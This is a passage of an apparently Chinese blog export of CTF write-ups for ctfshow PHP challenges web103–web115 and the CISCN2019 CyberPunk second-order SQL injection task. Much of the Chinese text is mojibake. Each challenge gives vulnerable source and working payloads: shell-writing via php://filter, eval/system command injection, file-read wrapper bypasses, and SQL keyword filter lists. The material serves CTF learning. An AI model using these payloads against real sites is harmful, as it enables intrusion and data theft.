<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">GET:v2=<span class="number">225044383959474e6864434171594473</span>&amp;v3=php:<span class="comment">//filter/write=convert.base64-decode/resource=g.php</span></span><br><span class="line">POST:v1=hex2bin</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¯¦ç»†è¯´è¯´</span></span><br><span class="line"><span class="comment">//v2æ˜¯å…ˆç»è¿‡base64å†hexåŠ å¯†çš„shellï¼ŒåŸå‹æ˜¯<span class="meta">&lt;?</span>=`cat *`;</span></span><br><span class="line"><span class="comment">//è¯´è¦è¿æ°”æ˜¯v2ä¸­åˆšå¥½åªæœ‰ä¸€ä¸ªeï¼Œå°±æ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œä¹Ÿå°±æ˜¯æ•°å€¼äº†</span></span><br><span class="line"><span class="comment">//v3ç”¨ä¼ªåè®®</span></span><br><span class="line"><span class="comment">//v1çš„hex2binæ˜¯ä¸ºäº†å°†16è¿›åˆ¶è½¬åŒ–å›asciiå­—ç¬¦ï¼Œå‰é¢çš„22æ˜¯åŠ çš„ï¼Œç»•è¿‡substrçš„æˆªæ–­</span></span><br></pre></td></tr></table></figure>

<h3 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1($v1)==sha1($v2))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//æ²¡getåˆ°è€ƒç‚¹ï¼Œåº”è¯¥æ˜¯å‡ºé¢˜äººå¯èƒ½å°‘æ‰“äº†ä¸ªâ€˜=â€™ï¼Œä¼ ä¸€æ ·çš„å€¼å°±è¡Œ</span></span><br></pre></td></tr></table></figure>



<h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$error=<span class="string">'ä½ è¿˜æƒ³è¦flagå˜›ï¼Ÿ'</span>;</span><br><span class="line">$suces=<span class="string">'æ—¢ç„¶ä½ æƒ³è¦é‚£ç»™ä½ å§ï¼'</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($key===<span class="string">'error'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"what are you doing?!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;<span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">    <span class="keyword">if</span>($value===<span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"what are you doing?!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!($_POST[<span class="string">'flag'</span>]==$flag))&#123;</span><br><span class="line">    <span class="keyword">die</span>($error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"your are good"</span>.$flag.<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">die</span>($suces);</span><br></pre></td></tr></table></figure>

<p>ç»å…¸å˜é‡è¦†ç›–ï¼Œå¼€å§‹æ²¡æ‰¾åˆ°ç‚¹ï¼Œåæ¥å‡ºé¢˜å¸ˆå‚…è¯´è¦ç”¨<code>die($error)</code>,è¿™å°±æ‡‚äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">POSTï¼šerror=$flag&amp;flag=$$flag</span><br><span class="line">GETï¼š$flag=flag</span><br><span class="line">åˆ†æï¼š</span><br><span class="line">postï¼š</span><br><span class="line">error=$flag=&gt;$error=$$flag</span><br><span class="line">è¦è®©$error=$flagæ‹¿åˆ°flagï¼Œè¿™ä¸€æ­¥çš„å‰ææ˜¯$_POST[<span class="string">'flag'</span>]!=$flag</span><br><span class="line">get:</span><br><span class="line">$flag=flag=&gt;$$flag=$flag</span><br><span class="line">post:</span><br><span class="line">flag=$$flag</span><br></pre></td></tr></table></figure>

<h3 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line">    <span class="keyword">if</span>(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ•°ç»„ç»•è¿‡å³å¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">GET:v2[]=<span class="number">2</span></span><br><span class="line">POST:v1[]=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'v1'</span>]))&#123;</span><br><span class="line">    $v1 = $_POST[<span class="string">'v1'</span>];</span><br><span class="line">    $v3 = $_GET[<span class="string">'v3'</span>];</span><br><span class="line">       parse_str($v1,$v2);</span><br><span class="line">       <span class="keyword">if</span>($v2[<span class="string">'flag'</span>]==md5($v3))&#123;</span><br><span class="line">           <span class="keyword">echo</span> $flag;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>parse_str()</code>å˜é‡è¦†ç›–ï¼ŒMD5ç›¸ç­‰åªéœ€è¦æ‰¾åˆ°åŠ å¯†åä»¥<code>0e</code>å¼€å¤´ï¼Œçº¯æ•°å­—çš„å³å¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#payload</span><br><span class="line">GET:v3&#x3D;240610708</span><br><span class="line">POST:v1&#x3D;flag&#x3D;0e1</span><br></pre></td></tr></table></figure>

<h3 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ereg (<span class="string">"^[a-zA-Z]+$"</span>, $_GET[<span class="string">'c'</span>])===<span class="keyword">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//åªæœ‰36dçš„äººæ‰èƒ½çœ‹åˆ°flag</span></span><br><span class="line"><span class="keyword">if</span>(intval(strrev($_GET[<span class="string">'c'</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åªèƒ½å‡ºç°å­—æ¯ï¼Œå¹¶ä¸”å­—ç¬¦ä¸²å€’åºå–æ•´çš„å€¼ï¼Œ<code>%00</code>æˆªæ–­</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#payload</span><br><span class="line">c&#x3D;a%00778</span><br></pre></td></tr></table></figure>

<h3 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/[a-zA-Z]+/'</span>, $v1) &amp;&amp; preg_match(<span class="string">'/[a-zA-Z]+/'</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">"echo new $v1($v2());"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>ç”¨åˆ°äº†å¼‚å¸¸ç±»ï¼Œçœ‹åˆ°æ ¼å¼æƒ³ç€æ˜¯ç±»ï¼Œä½†æ˜¯æ²¡æœ‰æƒ³åˆ°æŠ›å‡ºå¼‚å¸¸ç±»ï¼Œé—®äº†ç¾½å¸ˆå‚…ï¼Œæ‹¿åˆ°äº†payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line"><span class="number">1.</span>v1=<span class="keyword">Exception</span>;system(<span class="string">"cat%20fl36dg.txt"</span>);<span class="comment">//&amp;v2=a</span></span><br><span class="line"><span class="number">2.</span>v1=<span class="keyword">Exception</span>;<span class="comment">//&amp;v2=system("cat%20fl36dg.txt");</span></span><br></pre></td></tr></table></figure>

<h3 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span>, $v1))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"error v1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"error v2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"echo new $v1($v2());"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;phpff.com&#x2F;filesystemiterator</span><br><span class="line">https:&#x2F;&#x2F;www.php.net&#x2F;manual&#x2F;zh&#x2F;class.filesystemiterator.php</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨filesystemiteratorç±»å¸¦å‡ºæŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</p>
<p><code>getcwd</code>ï¼ŒæŸ¥çœ‹å½“å‰è·¯å¾„ä¸‹çš„æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure>

<h3 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">(&amp;$v1,&amp;$v2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"$$v1 = &amp;$$v2;"</span>);</span><br><span class="line">    var_dump($$v1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'v1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'v2'</span>]))&#123;</span><br><span class="line">    $v1 = $_GET[<span class="string">'v1'</span>];</span><br><span class="line">    $v2 = $_GET[<span class="string">'v2'</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/'</span>, $v1))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"error v1"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/'</span>, $v2))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"error v2"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/ctfshow/'</span>, $v1))&#123;</span><br><span class="line">            getFlag($v1,$v2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//å˜é‡è¦†ç›–+GLOBALSå…¨å±€å˜é‡</span></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure>

<h3 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/\.\.\/|http|https|data|input|rot13|base64|string/i'</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"hacker!"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hacker!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ç”¨phpä¼ªåè®®ï¼Œè¿‡æ»¤rot13ï¼Œstringï¼Œbase64ï¼Œå¯ä»¥ç”¨base16æˆ–è€…base32ç­‰ç»•è¿‡</span></span><br><span class="line"><span class="comment">#payload</span></span><br><span class="line">?file=php:<span class="comment">//filter/read=convert.base16-encode/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/resource=flag.php</span></span><br><span class="line">compress.zlib:<span class="comment">//flag.php</span></span><br><span class="line">php:<span class="comment">//filter/convert.icnov.UCS-2LE.UCS-2BE/resource=flag.php</span></span><br><span class="line">php:<span class="comment">//filter/read=convert.quoted-printable-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<h3 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/filter|\.\.\/|http|https|data|data|rot13|base64|string/i'</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hacker!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>filterè¿‡æ»¤å™¨è¢«è¿‡æ»¤ï¼Œä¼ªåè®®ç”¨ä¸äº†äº†</p>
<p>è¿™é‡Œä¸»è¦æ˜¯è¦ç»•è¿‡<code>is_file()</code>è¿™ä¸ªphpçš„å†…ç½®å‡½æ•°</p>
<p>è¿™é‡ŒæŸ¥é˜…èµ„æ–™å¯ä»¥æ„é€ è½¯é“¾æ¥ï¼Œè¶…è¿‡äºŒåæ¬¡å°±å¯ä»¥ç»•è¿‡<code>is_file</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?file=/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/proc/<span class="keyword">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br><span class="line">    éé¢„æœŸ</span><br><span class="line">compress.zlib:<span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure>

<h3 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i'</span>,$file))&#123;<span class="comment">//ç¦ç”¨äº†convertï¼Œdataç­‰ï¼Œä½†æ˜¯æ”¾å‡ºäº†filterï¼Œä¸ç¼–ç æ ¼å¼ç›´æ¥è¯»</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file=php:<span class="comment">//filter/read=/resource=flag.php</span></span><br></pre></td></tr></table></figure>

<h3 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($num)</span></span>&#123;</span><br><span class="line">    $num=str_replace(<span class="string">"0x"</span>,<span class="string">"1"</span>,$num);<span class="comment">//åå…­è¿›åˆ¶è¢«ç¦</span></span><br><span class="line">    $num=str_replace(<span class="string">"0"</span>,<span class="string">"1"</span>,$num);<span class="comment">//å…«è¿›åˆ¶è¢«ç¦</span></span><br><span class="line">    $num=str_replace(<span class="string">"."</span>,<span class="string">"1"</span>,$num);</span><br><span class="line">    $num=str_replace(<span class="string">"e"</span>,<span class="string">"1"</span>,$num);<span class="comment">//ç§‘å­¦è®¡æ•°æ³•</span></span><br><span class="line">    $num=str_replace(<span class="string">"+"</span>,<span class="string">"1"</span>,$num);</span><br><span class="line">    <span class="keyword">return</span> $num;</span><br><span class="line">&#125;</span><br><span class="line">$num=$_GET[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>(is_numeric($num) <span class="keyword">and</span> $num!==<span class="string">'36'</span> <span class="keyword">and</span> trim($num)!==<span class="string">'36'</span> <span class="keyword">and</span> filter($num)==<span class="string">'36'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>($num==<span class="string">'36'</span>)&#123;<span class="comment">//trim()è¿‡æ»¤ç©ºæ ¼ä»¥åŠ\n\r\t\v\0,ä¸è¿‡æ»¤\f</span></span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è½¬ä¹‰å­—ç¬¦ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">num=%<span class="number">0</span>c36<span class="comment">//%0c==\f</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>show</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLChallenge</title>
    <url>/2020/05/30/SQLChallenge/</url>
    <content><![CDATA[<p>SQLæ³¨å…¥é¢˜å‹å¾ˆå¤šï¼Œæ–¹æ³•è¿˜æ˜¯é‚£ä¸€äº›ï¼Œå°±æŠŠSQLæ³¨å…¥é¢˜æ”¾ä¸€èµ·ï¼Œæ–¹ä¾¿å¤ä¹ å›é¡¾<a id="more"></a></p>
<h3 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</h3><p>æ‰“å¼€é¡µé¢æ˜¯ä¸€ä¸ªè®¢å•æäº¤çš„é¡µé¢ï¼Œçœ‹ä¸€ä¸‹ç½‘é¡µæºç æ‰¾åˆ°äº†æç¤ºï¼Œåº”è¯¥æ˜¯ç”¨filter://æ¥è¯»å–æºç </p>
<p>ä¾æ¬¡è¯»å–config.php,delete.php,change.php,confirm.php,base64è§£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#confirm.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"address"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $address = $_POST[<span class="string">"address"</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($fetch-&gt;num_rows&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        $msg = $user_name.<span class="string">"Ã¥Â·Â²Ã¦ÂÂÃ¤ÂºÂ¤Ã¨Â®Â¢Ã¥ÂÂ•"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)"</span>;</span><br><span class="line">        $re = $db-&gt;prepare($sql);</span><br><span class="line">        $re-&gt;bind_param(<span class="string">"sss"</span>, $user_name, $address, $phone);</span><br><span class="line">        $re = $re-&gt;execute();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#search.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#change.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">"config.php"</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"user_name"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"address"</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">"phone"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = <span class="string">''</span>;</span><br><span class="line">    $pattern = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br><span class="line">    $user_name = $_POST[<span class="string">"user_name"</span>];</span><br><span class="line">    $address = addslashes($_POST[<span class="string">"address"</span>]);</span><br><span class="line">    $phone = $_POST[<span class="string">"phone"</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = <span class="string">'no sql inject!'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $sql = <span class="string">"select * from `user` where `user_name`='&#123;$user_name&#125;' and `phone`='&#123;$phone&#125;'"</span>;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = <span class="string">"update `user` set `address`='"</span>.$address.<span class="string">"', `old_address`='"</span>.$row[<span class="string">'address'</span>].<span class="string">"' where `user_id`="</span>.$row[<span class="string">'user_id'</span>];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥çœ‹åˆ°user_nameå’Œphoneéƒ½ç»è¿‡äº†ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œåªæœ‰addresså¯èƒ½å¯ä»¥æ³¨å…¥</p>
<p>è¿™é‡Œæ³¨æ„åˆ°addressç»è¿‡addslasheså‡½æ•°è½¬ä¹‰ä¸ä¼šé€ æˆæ³¨å…¥ï¼Œä½†æ˜¯ä¼šè·Ÿç€user_nameå’Œphoneå­˜å…¥æ•°æ®åº“ï¼Œåœ¨å­˜å…¥mysqlæ•°æ®åº“çš„æ—¶å€™è½¬ä¹‰çš„å­—ç¬¦ä¼šè¢«å»æ‰ï¼Œä¹Ÿå°±æ˜¯è¯´æ•°æ®åˆæ¢å¤åˆ°è¾“å…¥çš„æ—¶å€™ï¼Œè¿™å°±å¯ä»¥åˆ©ç”¨äºŒæ¬¡æ³¨å…¥äº†</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$sql = "<span class="keyword">update</span> <span class="string">`user`</span> <span class="keyword">set</span> <span class="string">`address`</span>=<span class="string">'".$address."'</span>, <span class="string">`old_address`</span>=<span class="string">'".$row['</span>address<span class="string">']."'</span> <span class="keyword">where</span> <span class="string">`user_id`</span>=<span class="string">".$row['user_id'];</span></span><br></pre></td></tr></table></figure>

